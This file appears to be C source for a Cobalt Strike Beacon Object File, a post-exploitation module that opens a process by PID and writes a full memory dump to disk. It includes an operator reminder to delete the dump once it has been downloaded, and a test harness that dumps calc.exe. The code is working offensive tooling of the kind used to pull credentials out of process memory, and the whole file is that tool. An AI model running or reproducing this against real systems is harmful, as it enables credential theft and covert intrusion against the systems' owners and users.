#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "anticrash.c"



DWORD procdump(const DWORD pid, const wchar_t * path)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	BOOL dumped = FALSE;
	HANDLE hFile = NULL;
	HANDLE hProc = NULL;

	//First lets see if we can even get our handle we want
	hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, pid);
	if(hProc == NULL)
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "Unable to open target PID: %lX\n", dwErrorCode);
		goto end;
	}
	//Next lets open the output file
	hFile = KERNEL32$CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "Unable to open output file: %lX\n", dwErrorCode);
		goto end;
	}
	//Ok well lets try to dump it
	dumped = DBGHELP$MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if(!dumped)
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "Unable to dump pid to file: %lX\n", dwErrorCode);
		goto end;
	}
	internal_printf("Wrote dump to file: %S\n", path);
	internal_printf("Don't forget to delete it after you finish downloading it!\n");

end:
	if(hFile)
	{
		KERNEL32$CloseHandle(hFile);
		hFile = NULL;
	}
	if(hProc)
	{
		KERNEL32$CloseHandle(hProc);
		hProc = NULL;
	}
	if(!dumped)
	{
		KERNEL32$DeleteFileW(path);
	}

	return dwErrorCode;
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser;

	BeaconDataParse(&parser, Buffer, Length);
	const DWORD dwPid = (DWORD)BeaconDataInt(&parser);
	LPCWSTR swzPath = (LPWSTR)BeaconDataExtract(&parser, NULL);
	if(!bofstart())
	{
		return;
	}
	
	internal_printf("Dumping PID:%lu to %S\n", dwPid, swzPath);

	dwErrorCode = procdump(dwPid, swzPath);
	if ( ERROR_SUCCESS != dwErrorCode )
	{
		BeaconPrintf(CALLBACK_ERROR, "procdump failed: %lX\n", dwErrorCode);
		goto go_end;	
	}

	internal_printf("SUCCESS.\n");

go_end:	
	printoutput(TRUE);

	bofstop();
};
#else
#define TEST_OUTPUT_PATH L"output.dmp"
#define TEST_TARGET_PROCESS L"C:\\Windows\\system32\\calc.exe"
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD dwPid = 0;
	LPCWSTR swzPath = TEST_OUTPUT_PATH;
	STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    MSVCRT$memset( &si, 0, sizeof(si) );
    si.cb = sizeof(si);
    MSVCRT$memset( &pi, 0, sizeof(pi) );
	
	if ( !KERNEL32$CreateProcessW( TEST_TARGET_PROCESS, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi ) ) 		
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "CreateProcessW failed: %lX\n", dwErrorCode);
		goto main_end;
	}

	dwPid = pi.dwProcessId;

	KERNEL32$CloseHandle( pi.hProcess );
    KERNEL32$CloseHandle( pi.hThread );
	
	internal_printf("Dumping PID:%lu to %S\n", dwPid, swzPath);

	dwErrorCode = procdump(dwPid, swzPath);
	if ( ERROR_SUCCESS != dwErrorCode )
	{
		BeaconPrintf(CALLBACK_ERROR, "procdump failed: %lX\n", dwErrorCode);	
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif
